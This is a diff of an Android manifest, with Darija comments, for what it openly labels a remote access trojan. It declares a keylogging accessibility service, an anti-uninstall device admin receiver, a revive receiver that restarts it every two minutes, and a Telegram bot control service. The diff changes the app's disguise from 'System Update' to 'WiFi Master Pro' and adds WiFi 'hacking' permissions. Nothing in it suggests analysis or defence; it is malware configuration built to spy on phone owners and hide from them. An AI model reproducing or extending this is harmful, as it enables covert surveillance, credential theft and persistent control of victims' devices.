@@ -2,10 +2,10 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.sys.updater">
 
-    <!-- Permissions L'Asasiyin -->
+    <!-- Permissions L'Asasiyin dyal l'RAT -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
@@ -20,7 +20,7 @@
     <uses-permission android:name="android.permission.SET_WALLPAPER" />
     <uses-permission android:name="android.permission.VIBRATE" />
 
-    <!-- Permissions L'Jdad li khassk tzid -->
+    <!-- Permissions dyal l'RAT -->
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
     <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
@@ -31,13 +31,18 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
+    <!-- JDAD: Permissions dyal l'WiFi Hacking UI -->
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.NEARBY_WIFI_DEVICES" />
+
     <application
         android:allowBackup="false"
-        android:icon="@android:drawable/sym_def_app_icon"
-        android:label="System Update"
+        android:icon="@android:drawable/ic_menu_manage" 
+        android:label="WiFi Master Pro"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
-        <!-- Main Activity -->
+        <!-- Main Activity (L'UI dyal WiFi Hacking) -->
         <activity android:name=".MainActivity" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -45,7 +50,7 @@
             </intent-filter>
         </activity>
 
-        <!-- Device Admin Receiver -->
+        <!-- Device Admin Receiver (Anti-Uninstall) -->
         <receiver
             android:name=".MyDeviceAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -58,7 +63,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- Accessibility Service (Keylogger) -->
+        <!-- Accessibility Service (Keylogger & Ghost Touch) -->
         <service
             android:name=".KeyloggerService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
@@ -91,10 +96,10 @@
             </intent-filter>
         </receiver>
 
-        <!-- Revive Receiver (Kol 5 dqayq) -->
+        <!-- Revive Receiver (Kol 2 dqayq) -->
         <receiver android:name=".ReviveReceiver" android:exported="false" />
 
-        <!-- Telegram Bot Service -->
+        <!-- Telegram Bot Service (L'RAT) -->
         <service
             android:name=".TelegramService"
             android:foregroundServiceType="dataSync"
